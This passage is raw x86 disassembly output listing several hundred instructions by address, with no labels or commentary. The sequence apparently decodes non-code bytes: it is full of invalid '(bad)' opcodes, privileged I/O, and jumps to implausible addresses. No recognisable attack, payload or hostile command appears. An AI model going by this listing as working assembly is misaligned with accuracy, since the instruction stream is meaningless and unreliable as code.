  41f729:	gs in  al,dx
  41f72b:	push   es
  41f72c:	ss pop esi
  41f72e:	or     eax,0x8925c1ae
  41f733:	cli    
  41f734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f735:	pop    edi
  41f736:	aaa    
  41f737:	adc    BYTE PTR [eax+0x27],bl
  41f73a:	jae    0x41f751
  41f73c:	dec    esi
  41f73d:	out    dx,eax
  41f73e:	add    ebx,0x6636b1c6
  41f744:	add    al,0x3d
  41f746:	aaa    
  41f747:	and    DWORD PTR [esi],eax
  41f749:	inc    edi
  41f74a:	inc    ebx
  41f74b:	sbb    al,BYTE PTR [esi+0x22]
  41f74e:	into   
  41f74f:	dec    eax
  41f750:	sbb    esp,DWORD PTR [ebx-0x32]
  41f753:	add    ch,ch
  41f755:	sbb    DWORD PTR [ecx-0x2a469546],edx
  41f75b:	add    BYTE PTR [edx+0x2feba42e],dl
  41f761:	mov    ebx,0x89f0c924
  41f766:	sub    al,0xbd
  41f768:	sub    al,dh
  41f76a:	(bad)  
  41f76d:	pop    edi
  41f76e:	repnz icebp 
  41f770:	loope  0x41f70f
  41f772:	out    0x96,eax
  41f774:	pop    esp
  41f775:	repz in eax,0x17
  41f778:	enter  0x8436,0x29
  41f77c:	adc    al,0x96
  41f77e:	push   edi
  41f77f:	push   ebx
  41f780:	test   DWORD PTR [ecx+ebx*1+0xa],ecx
  41f784:	ror    esi,1
  41f786:	scas   eax,DWORD PTR es:[edi]
  41f787:	cs xchg esi,eax
  41f789:	mov    ebp,0xa764ccc4
  41f78e:	jecxz  0x41f722
  41f790:	loopne 0x41f7eb
  41f792:	dec    ebp
  41f793:	adc    dh,BYTE PTR [eax-0x25d85628]
  41f799:	idiv   ah
  41f79b:	les    edi,FWORD PTR [ebx+0x5c3267c5]
  41f7a1:	js     0x41f786
  41f7a3:	pop    ebx
  41f7a4:	(bad)  
  41f7a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7a6:	and    BYTE PTR [esi+0x62],al
  41f7a9:	fisttp DWORD PTR [eax-0x1]
  41f7ac:	pop    edi
  41f7ad:	into   
  41f7ae:	iret   
  41f7af:	aas    
  41f7b0:	sub    edi,DWORD PTR [edx+ebx*2]
  41f7b3:	or     DWORD PTR [ebx+0x3a],ebx
  41f7b6:	mov    bl,0x53
  41f7b8:	jmp    0xd2f8c781
  41f7bd:	scas   al,BYTE PTR es:[edi]
  41f7be:	dec    ecx
  41f7bf:	pop    ebp
  41f7c0:	xchg   DWORD PTR [bx],edx
  41f7c3:	xchg   DWORD PTR [ebx-0x31],ecx
  41f7c6:	pushf  
  41f7c7:	out    0x90,al
  41f7c9:	call   0x97f7:0xefbd3442
  41f7d0:	clc    
  41f7d1:	pop    ecx
  41f7d2:	push   ss
  41f7d3:	fs dec eax
  41f7d5:	leave  
  41f7d6:	scas   al,BYTE PTR es:[edi]
  41f7d7:	or     eax,0xd0274e6e
  41f7dc:	add    al,BYTE PTR [ecx-0x59]
  41f7df:	jg     0x41f7c0
  41f7e1:	xchg   ebx,eax
  41f7e2:	dec    edi
  41f7e3:	xlat   BYTE PTR ds:[ebx]
  41f7e4:	jmp    0x41f7de
  41f7e6:	xchg   edi,eax
  41f7e7:	jmp    0x41f7f9
  41f7e9:	call   0x63de31c1
  41f7ee:	xchg   BYTE PTR [ebx*2+0x1be2a105],bh
  41f7f5:	data16 aam 0xfb
  41f7f8:	cwde   
  41f7f9:	shr    BYTE PTR [ebx],cl
  41f7fb:	push   ebp
  41f7fc:	dec    esp
  41f7fd:	sub    edi,DWORD PTR [edi]
  41f7ff:	sub    al,0x49
  41f801:	into   
  41f802:	sub    bl,BYTE PTR [edi-0x28]
  41f805:	jns    0x41f837
  41f807:	out    0x43,al
  41f809:	or     eax,edi
  41f80b:	fadd   QWORD PTR [edx+0x5dd14e4f]
  41f811:	sbb    ecx,DWORD PTR [edx]
  41f813:	mov    bl,0x2a
  41f815:	mov    ds:0x1b375d64,eax
  41f81a:	push   0xffffffaa
  41f81c:	dec    eax
  41f81d:	inc    edx
  41f81e:	(bad)  
  41f81f:	jp     0x41f883
  41f821:	push   esp
  41f822:	push   0xffffffff
  41f824:	adc    bh,BYTE PTR [eax+0x62]
  41f827:	imul   ebx,DWORD PTR [ebp-0x19b661d2],0xffffffee
  41f82e:	inc    esi
  41f82f:	shl    BYTE PTR [ecx+0x56],cl
  41f832:	pop    eax
  41f833:	pop    esi
  41f834:	or     ebx,ebp
  41f836:	stos   DWORD PTR es:[edi],eax
  41f837:	xchg   edi,eax
  41f838:	ror    BYTE PTR [ecx+0x18],0xe2
  41f83c:	push   edi
  41f83d:	test   BYTE PTR [ecx+eiz*8],0x90
  41f841:	or     ebp,DWORD PTR [esi]
  41f843:	sahf   
  41f844:	push   eax
  41f845:	push   esp
  41f846:	test   al,0x90
  41f848:	inc    edx
  41f849:	int3   
  41f84a:	sahf   
  41f84b:	inc    esi
  41f84c:	scas   al,BYTE PTR es:[edi]
  41f84d:	ret    0xbdd3
  41f850:	into   
  41f851:	(bad)  
  41f852:	scas   al,BYTE PTR es:[edi]
  41f853:	cld    
  41f854:	sar    DWORD PTR [edx+0x13967ef3],1
  41f85a:	shr    BYTE PTR [ecx],0xf6
  41f85d:	sub    eax,0x73c0f8ad
  41f862:	shr    BYTE PTR [ecx],0xa4
  41f865:	sub    BYTE PTR [eax+0x1872964b],ah
  41f86b:	ds mov ?,eax
  41f86e:	jae    0x41f8cb
  41f870:	pushf  
  41f871:	sbb    DWORD PTR [esi],ebp
  41f873:	loop   0x41f875
  41f875:	js     0x41f88c
  41f877:	in     eax,dx
  41f878:	icebp  
  41f879:	inc    esp
  41f87a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f87b:	or     cl,al
  41f87d:	cmc    
  41f87e:	(bad)  
  41f87f:	pop    ebp
  41f880:	mov    bl,dh
  41f882:	addr16 or eax,0xd7a07313
  41f888:	mov    eax,ds:0x3799bc2d
  41f88d:	imul   edx,DWORD PTR [edi+0x70022208],0xffffff8e
  41f894:	or     edi,DWORD PTR ds:0x90440fde
  41f89a:	rol    DWORD PTR [edx],0x68
  41f89d:	mov    dh,0x56
  41f89f:	mov    WORD PTR [eax+0x78],?
  41f8a2:	dec    bx
  41f8a4:	outs   dx,DWORD PTR ds:[esi]
  41f8a5:	or     bl,BYTE PTR fs:[edx+0x2f906df]
  41f8ac:	stos   DWORD PTR es:[edi],eax
  41f8ad:	or     DWORD PTR ds:0xf9462dc1,ecx
  41f8b3:	mov    eax,ds:0x55d34827
  41f8b8:	mov    esi,0x2b4a6c21
  41f8bd:	and    DWORD PTR [ebp+0x3473f7d1],esi
  41f8c3:	mov    dl,0xfb
  41f8c5:	das    
  41f8c6:	and    BYTE PTR [eax+0x6c],al
  41f8c9:	inc    edi
  41f8ca:	test   BYTE PTR [edx-0x46],0x65
  41f8ce:	lods   eax,DWORD PTR ds:[esi]
  41f8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8d0:	jge    0x41f93f
  41f8d2:	mov    cl,0x39
  41f8d4:	xchg   esi,eax
  41f8d5:	mov    bh,0xe
  41f8d7:	pop    ecx
  41f8d8:	dec    edx
  41f8d9:	retf   0x8098
  41f8dc:	pusha  
  41f8dd:	add    BYTE PTR [ebx],0xe7
  41f8e0:	and    eax,0xcf95e4d
  41f8e5:	mov    ecx,0x28c7e039
  41f8ea:	jecxz  0x41f8f1
  41f8ec:	pop    ebp
  41f8ed:	add    ch,BYTE PTR [edx-0x13db9225]
  41f8f3:	mov    bh,0xda
  41f8f5:	xor    ch,BYTE PTR [ebx-0x5d1544f7]
  41f8fb:	sbb    eax,0x972717e0
  41f900:	mov    bl,0xd1
  41f902:	dec    eax
  41f903:	or     BYTE PTR [ecx-0x23],0x4d
  41f907:	stc    
  41f908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f909:	xchg   ebx,eax
  41f90a:	push   edi
  41f90b:	enter  0x435d,0xf2
  41f90f:	les    esi,FWORD PTR [esp+0x64]
  41f913:	mov    BYTE PTR [eax+eax*4+0x63],bh
  41f917:	add    dl,BYTE PTR [ebp-0x30]
  41f91a:	test   BYTE PTR [edx+0x5a],dl
  41f91d:	pop    esi
  41f91e:	xchg   ebp,eax
  41f91f:	mov    ch,0xb3
  41f921:	jmp    0x41f93c
  41f923:	pop    edi
  41f924:	xchg   edi,eax
  41f925:	push   edi
  41f926:	dec    edi
  41f927:	push   edi
  41f928:	scas   eax,DWORD PTR es:[edi]
  41f929:	sahf   
  41f92a:	in     eax,0x6e
  41f92c:	cmp    eax,0xd0686524
  41f931:	pop    esp
  41f932:	repz pop ebp
  41f934:	nop
  41f935:	xor    eax,0x6807a781
  41f93a:	adc    ch,bl
  41f93c:	push   esp
  41f93d:	mov    ?,WORD PTR [eax+0x30]
  41f940:	xor    edi,DWORD PTR [esi+ebx*4+0x71]
  41f944:	add    bh,BYTE PTR [edi+0x4e]
  41f947:	aaa    
  41f948:	fmul   st(2),st
  41f94a:	pop    ecx
  41f94b:	lahf   
  41f94c:	fstp   QWORD PTR [ebp-0x2f3c99a1]
  41f952:	call   0xea79ed38
  41f957:	call   0xf948:0x7d5f7718
  41f95e:	test   bl,dh
  41f960:	stos   DWORD PTR es:[edi],eax
  41f961:	test   al,0x32
  41f963:	jns    0x41f9bf
  41f965:	sbb    ah,dh
  41f967:	adc    eax,0x7390fafd
  41f96c:	pop    ebp
  41f96d:	adc    al,0xc4
  41f96f:	sbb    al,0x16
  41f971:	jg     0x41f8f4
  41f973:	fdivp  st(5),st
  41f975:	(bad)  
  41f976:	hlt    
  41f977:	sub    BYTE PTR [edi+0x20000043],0x16
  41f97e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97f:	lea    esi,[esi+0x25bf29bf]
  41f985:	lods   eax,DWORD PTR ds:[esi]
  41f986:	and    dl,al
  41f988:	mov    ebx,0x2807d6ea
  41f98d:	jbe    0x41f990
  41f98f:	add    BYTE PTR [esi-0x29fffffe],al
  41f995:	pop    eax
  41f996:	dec    ebx
  41f997:	mov    ds:0xee14ba2,eax
  41f99c:	or     BYTE PTR [ebp+0x7932d5d3],ch
  41f9a2:	dec    esi
  41f9a3:	ficomp DWORD PTR ds:0xcccdc6ef
  41f9a9:	fisttp DWORD PTR [ecx+0x60]
  41f9ac:	rcl    DWORD PTR [eax+0x39],cl
  41f9af:	jg     0x41f993
  41f9b1:	xchg   esi,eax
  41f9b2:	daa    
  41f9b3:	mov    dh,0xe7
  41f9b5:	popf   
  41f9b6:	stos   DWORD PTR es:[edi],eax
  41f9b7:	sbb    edi,DWORD PTR [esi-0x34]
  41f9ba:	in     al,0xb3
  41f9bc:	add    cl,dh
  41f9be:	addr16 jno 0x41f977
  41f9c1:	push   cs
  41f9c2:	push   ss
  41f9c3:	mov    dh,0xff
  41f9c5:	jb     0x41f9e1
  41f9c7:	push   eax
  41f9c8:	ds mov ch,0xd6
  41f9cb:	mov    eax,ds:0x8dead26a
  41f9d0:	int3   
  41f9d1:	dec    edi
  41f9d2:	ja     0x41f9cf
  41f9d4:	dec    ecx
  41f9d5:	out    dx,eax
  41f9d6:	xor    al,0xed
  41f9d8:	int    0x38
  41f9da:	or     esi,DWORD PTR [eax-0x366835b1]
  41f9e0:	retf   0x656f
  41f9e3:	jnp    0x41f9ad
  41f9e5:	test   DWORD PTR [eax-0x29],0xebdbcbc9
  41f9ec:	cs inc esi
  41f9ee:	xchg   edi,eax
  41f9ef:	cvtpi2ps xmm2,QWORD PTR [edx]
  41f9f2:	lahf   
  41f9f3:	push   ss
  41f9f4:	and    DWORD PTR [eax],esi
  41f9f6:	aam    0x30
  41f9f8:	pop    ds
  41f9f9:	push   es
  41f9fa:	cmp    dl,BYTE PTR [edx-0x7f9733ef]
  41fa00:	pop    DWORD PTR [ebx+eiz*8]
  41fa03:	enter  0x8b4c,0x38
  41fa07:	sub    BYTE PTR [ebp+0x2af68506],dl
  41fa0d:	cmp    eax,0x7af8c64a
  41fa12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa13:	js     0x41fa90
  41fa15:	mov    esp,0xa7b862f3
  41fa1a:	test   DWORD PTR [edi+0x4a489b76],0xd0a8344b
  41fa24:	std    
  41fa25:	outs   dx,BYTE PTR ds:[esi]
  41fa26:	or     eax,0xf2d59067
  41fa2b:	or     edx,eax
  41fa2d:	xchg   ecx,eax
  41fa2e:	imul   ecx,ecx,0xb47bd882
  41fa34:	stos   BYTE PTR es:[edi],al
  41fa35:	add    bh,BYTE PTR [ecx]
  41fa37:	arpl   WORD PTR [edx-0x6f],si
  41fa3a:	clc    
  41fa3b:	(bad)  [ebp-0x2ba1a4fe]
  41fa41:	mov    edx,DWORD PTR [edx+0x6d]
  41fa44:	add    DWORD PTR [ebp-0x19],esp
  41fa47:	fisttp DWORD PTR [edx+0x56]
  41fa4a:	add    esi,ebx
  41fa4c:	or     al,0xaa
  41fa4e:	int    0xe6
  41fa50:	cdq    
  41fa51:	sbb    DWORD PTR [esi-0x6d],ecx
  41fa54:	adc    dh,al
  41fa56:	scas   al,BYTE PTR es:[edi]
  41fa57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa58:	cmovge esi,DWORD PTR [edx+ebx*2]
  41fa5c:	jo     0x41fa86
  41fa5e:	or     ch,BYTE PTR [ecx-0x39820b70]
  41fa64:	xor    BYTE PTR [ecx-0xd95bdc7],ah
  41fa6a:	xor    edx,esi
  41fa6c:	add    ch,BYTE PTR [ebx+0x947522d]
  41fa72:	mov    fs,ecx
  41fa74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa75:	retw   0x2d58
  41fa79:	sbb    eax,0xa1fb0e3f
  41fa7e:	inc    edx
  41fa7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa80:	xchg   ecx,eax
  41fa81:	inc    BYTE PTR [edi-0x55]
  41fa84:	xchg   ebx,eax
  41fa85:	mov    cl,0x5d
  41fa87:	dec    edi
  41fa88:	push   eax
  41fa89:	clc    
  41fa8a:	sbb    BYTE PTR [ebx+0x47],cl
  41fa8d:	and    BYTE PTR [esi-0x2f],dh
  41fa90:	mov    ebx,0x7f22392
  41fa95:	mov    eax,0xe7a4c43d
  41fa9a:	ficom  DWORD PTR [edi+0x76]
  41fa9d:	sbb    al,0x92
  41fa9f:	sbb    BYTE PTR [edx-0x6c9726ea],ah
  41faa5:	(bad)  
  41faa6:	dec    edi
  41faa7:	ins    DWORD PTR es:[edi],dx
  41faa8:	aam    0xb
  41faaa:	xchg   esp,eax
  41faab:	stos   DWORD PTR es:[edi],eax
  41faac:	retf   0x657f
  41faaf:	jns    0x41fa69
  41fab1:	inc    edi
  41fab2:	mov    ds:0x6b11482c,eax
  41fab7:	jmp    0x3b2b812d
  41fabc:	test   al,0xcd
  41fabe:	das    
  41fabf:	sub    BYTE PTR [ebx+0x4c],dl
  41fac2:	(bad)  
  41fac3:	adc    DWORD PTR [edx+ebx*1-0x5a],edi
  41fac7:	test   DWORD PTR [ecx],edi
  41fac9:	pop    edx
  41faca:	mov    BYTE PTR [edx],dh
  41facc:	das    
  41facd:	in     al,0x53
  41facf:	sub    eax,DWORD PTR ds:0xa407c6de
  41fad5:	int3   
  41fad6:	ja     0x41facc
  41fad8:	es push esi
  41fada:	pop    eax
  41fadb:	lahf   
  41fadc:	mov    ch,0x91
  41fade:	cmp    edi,DWORD PTR [ebx-0x23796263]
  41fae4:	push   ss
  41fae5:	mov    edi,DWORD PTR [ebx-0x2acf76e9]
  41faeb:	lods   al,BYTE PTR ds:[esi]
  41faec:	xchg   edi,eax
  41faed:	lahf   
  41faee:	inc    edx
  41faef:	nop
  41faf0:	out    0xb1,al
  41faf2:	adc    edi,DWORD PTR [esi-0x78]
  41faf5:	(bad)  
  41faf6:	adc    eax,0x8adbf5bd
  41fafb:	push   cs
  41fafc:	pop    ebx
  41fafd:	lods   eax,DWORD PTR ds:[esi]
  41fafe:	xor    BYTE PTR [ebp+esi*2+0x343b6c3a],dl
  41fb05:	loopne 0x41fa95
  41fb07:	mov    esi,0x11f831e7
  41fb0c:	mov    bh,0x4a
  41fb0e:	loopne 0x41fb52
  41fb10:	push   0x37
  41fb12:	daa    
  41fb13:	sti    
  41fb14:	ret    
  41fb15:	cwde   
  41fb16:	ret    0xe45d
  41fb19:	(bad)  
  41fb1a:	and    bl,BYTE PTR [eax-0x50]
  41fb1d:	adc    cl,BYTE PTR gs:[esi-0x5a]
  41fb21:	mov    al,ds:0x227078d4
  41fb26:	sahf   
  41fb27:	loopne 0x41faf9
  41fb29:	std    
  41fb2a:	and    al,0x3c
  41fb2c:	inc    esp
  41fb2d:	loope  0x41fb10
  41fb2f:	test   BYTE PTR [eax+eax*2+0x68],ch
  41fb33:	sub    DWORD PTR [ebp+0x23],ebx
  41fb36:	les    ebx,FWORD PTR [edx+0x1e2fb21e]
  41fb3c:	dec    esp
  41fb3d:	in     eax,dx
  41fb3e:	jp     0x41fb1a
  41fb40:	mov    ecx,0xaf5156b
  41fb45:	xchg   BYTE PTR [esi+esi*1],al
  41fb48:	jle    0x41fbb6
  41fb4a:	adc    ecx,DWORD PTR [eax]
  41fb4c:	xchg   esi,eax
  41fb4d:	iret   
  41fb4e:	jg     0x41fbad
  41fb50:	icebp  
  41fb51:	cmp    dh,dl
  41fb53:	pop    es
  41fb54:	adc    eax,0x45db1437
  41fb59:	sub    ebx,DWORD PTR [edx]
  41fb5b:	sbb    bl,BYTE PTR [ecx]
  41fb5d:	in     eax,dx
  41fb5e:	nop
  41fb5f:	ds loopne 0x41fbd8
  41fb62:	sub    edi,DWORD PTR [ebx+0x25e0f453]
  41fb68:	bound  eax,QWORD PTR [ecx]
  41fb6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb6b:	fxch   st(3)
  41fb6d:	dec    edx
  41fb6e:	cli    
  41fb6f:	push   ecx
  41fb70:	sahf   
  41fb71:	xor    edx,ebx
  41fb73:	mov    ebx,es
  41fb75:	mov    ds:0x8198a15c,eax
  41fb7a:	dec    esp
  41fb7b:	mov    bh,0x49
  41fb7e:	dec    edi
  41fb7f:	fbstp  TBYTE PTR [ebx-0x3a]
  41fb82:	mov    ch,0x2e
  41fb84:	test   BYTE PTR [ecx],dh
  41fb86:	and    al,0x94
  41fb88:	cld    
  41fb89:	jns    0x41fb54
  41fb8b:	ret    
  41fb8c:	in     al,0x46
  41fb8e:	outs   dx,BYTE PTR ds:[esi]
  41fb8f:	stos   BYTE PTR es:[edi],al
  41fb90:	xchg   DWORD PTR [ebp-0x53fe300c],ecx
  41fb96:	xchg   edx,eax
  41fb97:	lea    ecx,[esi-0x1f552160]
  41fb9d:	push   edx
  41fb9e:	pop    es
  41fb9f:	push   es
  41fba0:	inc    ebx
  41fba1:	jno    0x41fb3e
  41fba3:	jge    0x41fb55
  41fba5:	arpl   WORD PTR [edx+esi*1-0x56],bx
  41fba9:	fidivr DWORD PTR [esi+0x6c121579]
  41fbaf:	pop    ds
  41fbb0:	inc    esi
  41fbb1:	jp     0x41fbce
  41fbb3:	jp     0x41fbf4
  41fbb5:	and    al,ah
  41fbb7:	repnz or ah,0xb7
  41fbbb:	icebp  
  41fbbc:	xor    ebx,ebp
  41fbbe:	and    DWORD PTR [edx+0x3a90b15e],eax
  41fbc4:	add    esi,DWORD PTR [edi-0x57]
  41fbc7:	stc    
  41fbc8:	push   0xffffffb6
  41fbca:	ficom  WORD PTR [edx]
  41fbcc:	jmp    0xac3f1d4a
  41fbd1:	dec    ecx
  41fbd2:	dec    ebx
  41fbd3:	jno    0x41fbb5
  41fbd5:	and    al,0xfa
  41fbd7:	dec    esi
  41fbd8:	stos   DWORD PTR es:[edi],eax
  41fbd9:	fs test al,0xe0
  41fbdc:	dec    ebp
  41fbdd:	inc    ebp
  41fbde:	out    0x88,al
  41fbe0:	and    dh,BYTE PTR [ebx-0x2c16b48c]
  41fbe6:	add    eax,0x8aeff697
  41fbeb:	addr16 sub al,0x3
  41fbee:	xchg   ecx,eax
  41fbef:	pop    edi
  41fbf0:	(bad)  
  41fbf1:	fisubr WORD PTR cs:[ebp+0x42961342]
  41fbf8:	inc    edi
  41fbf9:	push   eax
  41fbfa:	push   es
  41fbfb:	and    DWORD PTR [edx+0x35c9fa5f],esi
  41fc01:	or     al,0x40
  41fc03:	xchg   ebp,eax
  41fc04:	ror    ch,cl
  41fc06:	mov    cl,0x53
  41fc08:	loopne 0x41fc62
  41fc0a:	mov    fs,esi
  41fc0c:	lds    esi,FWORD PTR [edx]
  41fc0e:	pop    ss
  41fc0f:	dec    edi
  41fc10:	loope  0x41fc3a
  41fc12:	pop    ecx
  41fc13:	js     0x41fbab
  41fc15:	ins    BYTE PTR es:[edi],dx
  41fc16:	push   ebx
  41fc17:	lods   eax,DWORD PTR ds:[esi]
  41fc18:	and    esi,DWORD PTR [eax+0x33b00000]
  41fc1e:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  41fc24:	test   DWORD PTR [edi-0x77fbf342],esi
  41fc2a:	push   es
  41fc2b:	inc    esp
  41fc2c:	scas   al,BYTE PTR es:[edi]
  41fc2d:	js     0x41fc30
  41fc2f:	add    BYTE PTR [esi-0x1bfffffe],al
  41fc35:	inc    edi
  41fc36:	(bad)  
  41fc37:	fist   WORD PTR [ebx-0x24ff2de7]
  41fc3d:	sub    al,0x41
  41fc3f:	xor    DWORD PTR ds:0x3019637d,0x2f
  41fc46:	fs mov bh,0x78
  41fc49:	xchg   esi,eax
  41fc4a:	es jp  0x41fc26
  41fc4d:	xchg   edi,eax
  41fc4e:	in     al,dx
  41fc4f:	mov    edi,0x20c7ca2d
  41fc54:	mov    ds:0xce0668f1,al
  41fc59:	mov    dh,0x92
  41fc5b:	dec    ecx
  41fc5c:	das    
  41fc5d:	inc    edx
  41fc5e:	sbb    BYTE PTR [edx],bh
  41fc60:	pop    ss
  41fc61:	pop    eax
  41fc62:	je     0x41fc43
  41fc64:	test   bh,cl
  41fc66:	retf   0xe847
  41fc69:	scas   al,BYTE PTR es:[edi]
  41fc6a:	cwde   
  41fc6b:	dec    esp
  41fc6c:	stc    
  41fc6d:	mov    dl,0x68
  41fc6f:	push   ebp
  41fc70:	test   DWORD PTR [edx-0x23d9d210],edx
  41fc76:	stos   BYTE PTR es:[edi],al
  41fc77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc78:	jae    0x41fcde
  41fc7a:	(bad)  
  41fc7c:	push   eax
  41fc7d:	shr    BYTE PTR [eax+0x134a08eb],cl
  41fc83:	mov    bl,0xcd
  41fc85:	cli    
  41fc86:	jns    0x41fc47
  41fc88:	xlat   BYTE PTR ds:[ebx]
  41fc89:	cmp    al,0x88
  41fc8b:	jmp    0x41fc7e
  41fc8d:	daa    
  41fc8e:	ins    DWORD PTR es:[edi],dx
  41fc8f:	mov    edx,0x4ee09fb3
  41fc94:	std    
  41fc95:	cmp    eax,0xe7a0adfd
  41fc9a:	outs   dx,DWORD PTR ds:[esi]
  41fc9b:	xchg   ecx,eax
  41fc9c:	add    eax,0x8eba4947
  41fca1:	xchg   ebp,eax
  41fca2:	repnz cmp DWORD PTR [ebx+0x1081ce75],0x659cfc6d
  41fcad:	test   dh,dl
  41fcaf:	mov    dl,ah
  41fcb1:	stos   DWORD PTR es:[edi],eax
  41fcb2:	(bad)  
  41fcb3:	jns    0x41fd0d
  41fcb5:	out    dx,eax
  41fcb6:	or     cl,dh
  41fcb8:	retf   0x6f42
  41fcbb:	pop    esi
  41fcbc:	sahf   
  41fcbd:	aas    
  41fcbe:	jg     0x41fcf8
  41fcc0:	adc    al,0x36
  41fcc2:	jge    0x41fd16
  41fcc4:	sub    DWORD PTR [eax-0x1f1fe886],ebp
  41fcca:	inc    ebp
  41fccb:	mov    eax,ds:0x8b77153
  41fcd0:	fcomp  QWORD PTR [esi-0x2830e23d]
  41fcd6:	(bad)  
  41fcd7:	dec    ecx
  41fcd8:	inc    edi
  41fcd9:	adc    ch,dh
  41fcdb:	neg    BYTE PTR [eax-0x537d2de2]
  41fce1:	push   eax
  41fce2:	jbe    0x41fcf7
  41fce4:	pop    esi
  41fce5:	add    al,0x54
  41fce7:	xor    eax,0xbba46e02
  41fcec:	repnz fcom DWORD PTR [edx+0x4e772e65]
  41fcf3:	pop    es
  41fcf4:	jl     0x41fce6
  41fcf6:	xor    DWORD PTR [ecx+0x35],0x11d2b71
  41fcfd:	cmp    cl,BYTE PTR [edx+edx*8-0xc]
  41fd01:	lds    ebx,FWORD PTR [edx]
  41fd03:	dec    eax
  41fd04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd05:	dec    eax
  41fd06:	sub    eax,0x5eda8ed
  41fd0b:	inc    ecx
  41fd0c:	dec    edi
  41fd0d:	inc    edx
  41fd0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0f:	imul   ebp,DWORD PTR [ecx],0x74
  41fd12:	or     dl,BYTE PTR [ebx]
  41fd14:	icebp  
  41fd15:	lock sbb edx,edi
  41fd18:	xchg   edi,eax
  41fd19:	call   0x63c26f0b
  41fd1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd1f:	inc    esp
  41fd20:	mov    ah,0x80
  41fd22:	iret   
  41fd23:	push   esi
  41fd24:	(bad)  
  41fd28:	in     al,0xec
  41fd2a:	and    DWORD PTR [edi-0x36240019],edi
  41fd30:	fsub   DWORD PTR [ebp+0x38a797ec]
  41fd36:	sahf   
  41fd37:	and    BYTE PTR [ecx+0x2d8267e4],dh
  41fd3d:	clc    
  41fd3e:	xor    dl,al
  41fd40:	(bad)  
  41fd41:	frstor [esi+0x4043c1ea]
  41fd47:	cld    
  41fd48:	dec    edi
  41fd49:	push   0xffffffcd
  41fd4b:	inc    edx
  41fd4c:	aam    0xae
  41fd4e:	dec    ecx
  41fd4f:	xchg   ebp,eax
  41fd50:	loopne 0x41fdab
  41fd52:	cmp    eax,0xec88a4fe
  41fd57:	jg     0x41fd48
  41fd59:	or     dh,BYTE PTR [edx-0x2a]
  41fd5c:	mov    esp,DWORD PTR [edi-0x50bbbbbc]
  41fd62:	fld    QWORD PTR gs:[eax+ebx*4+0x13]
  41fd67:	adc    al,0x47
  41fd69:	nop    DWORD PTR [ebp+0x63df0110]
  41fd70:	and    eax,DWORD PTR [eax-0x2bc9924]
  41fd76:	push   ecx
  41fd77:	fwait
  41fd78:	sub    ecx,edi
  41fd7a:	xchg   BYTE PTR [eax],ch
  41fd7c:	and    DWORD PTR [ecx+0x6fff264f],edx
  41fd82:	sbb    al,0xbf
  41fd84:	cmp    WORD PTR [eax],si
  41fd87:	es hlt 
  41fd89:	jbe    0x41fdd5
  41fd8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd8c:	out    dx,al
  41fd8d:	inc    ebx
  41fd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8f:	jecxz  0x41fd58
  41fd91:	out    dx,al
  41fd92:	aas    
  41fd93:	and    BYTE PTR [edx-0x15eee85],0xf0
  41fd9a:	jbe    0x41fd7a
  41fd9c:	push   0x429dcb2b
  41fda1:	rcl    DWORD PTR [edx+esi*1+0x32],cl
  41fda5:	xchg   esi,eax
  41fda6:	imul   eax,DWORD PTR [esi-0x3d],0x138777b2
  41fdad:	les    eax,FWORD PTR ds:0x701df6fd
  41fdb3:	sbb    edx,DWORD PTR [ebx+0x4629ae40]
  41fdb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdba:	iret   
  41fdbb:	add    edi,DWORD PTR [esi+edx*1]
  41fdbe:	lahf   
  41fdbf:	push   esp
  41fdc0:	out    0x19,al
  41fdc2:	mov    ds:0x2aae5a2d,eax
  41fdc7:	gs jmp 0x8c42d001
  41fdcd:	or     DWORD PTR [ecx],eax
  41fdcf:	(bad)  
  41fdd1:	jmp    0xda118bf9
  41fdd6:	std    
  41fdd7:	es adc al,0x94
  41fdda:	imul   ebp,DWORD PTR [ecx-0x2b],0x173210c3
  41fde1:	cli    
  41fde2:	mov    bh,0xcd
  41fde4:	aaa    
  41fde5:	mov    edi,0x9c47702c
  41fdea:	ins    BYTE PTR es:[edi],dx
  41fdeb:	jmp    0x95a:0xd38f7338
  41fdf2:	test   al,0xee
  41fdf4:	test   DWORD PTR [eax],0x3eafc554
  41fdfa:	pop    esi
  41fdfb:	das    
  41fdfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdfd:	pop    edx
  41fdfe:	je     0x41fdaf
  41fe00:	jo     0x41fd87
  41fe02:	inc    esp
  41fe03:	sub    BYTE PTR [esi+0x549da3bf],cl
  41fe09:	jo     0x41fe59
  41fe0b:	push   0xffffffe5
  41fe0d:	std    
  41fe0e:	mov    eax,ds:0x83632e96
  41fe13:	out    dx,al
  41fe14:	mov    ebp,0x3acbf6bd
  41fe19:	jmp    0x57f0:0xb6947e0
  41fe20:	idiv   DWORD PTR ds:0x5ff5f2a8
  41fe26:	mov    al,0x77
  41fe28:	adc    DWORD PTR [ebp-0x80],edi
  41fe2b:	push   ebx
  41fe2c:	int    0xad
  41fe2e:	popa   
  41fe2f:	or     al,0x95
  41fe31:	cmp    DWORD PTR [ebp+0x65],ebp
  41fe34:	mov    cl,0xf1
  41fe36:	pusha  
  41fe37:	jle    0x41fe0d
  41fe39:	jg     0x41fea7
  41fe3b:	lahf   
  41fe3c:	rcl    BYTE PTR [edi+0x7f],1
  41fe3f:	lods   eax,DWORD PTR ds:[esi]
  41fe40:	enter  0xae9d,0xe3
